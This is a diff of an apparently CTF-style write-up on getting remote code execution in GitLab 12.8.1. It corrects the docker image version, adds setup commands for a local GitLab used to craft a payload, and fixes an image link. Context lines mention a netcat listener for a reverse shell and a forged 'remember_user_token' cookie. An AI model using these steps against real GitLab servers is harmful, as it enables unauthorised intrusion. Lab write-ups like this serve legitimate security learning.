@@ -231,13 +231,17 @@ Saving `secret_key_base`
 
 Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in another virtual machine.
 
-`docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.9.0-ce.0`
+`docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0`
 
-``
+`docker exec -ti gitlab /bin/bash`
 
-``
-``
-``
+Edit `secret_key` in /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+
+`gitlab-ctl reconfigure`
+
+`gitlab-ctl restart`
+
+`gitlab-rails console`
 
 `request = ActionDispatch::Request.new(Rails.application.env_config)`
 
@@ -264,7 +268,7 @@ And use `nc -nlvp 1234`
 
 We need install extensions *Cookie-Editor* in Mozilla fire fox. And login with "Remeber me".
 We wiil send a cookie payload to *remeber_user_token*
-![](img src="https://i.ibb.co/KbJdbkx/2021-01-18-225644.png)
+![](https://i.ibb.co/KbJdbkx/2021-01-18-225644.png)
 
 Starting payload...
 ```
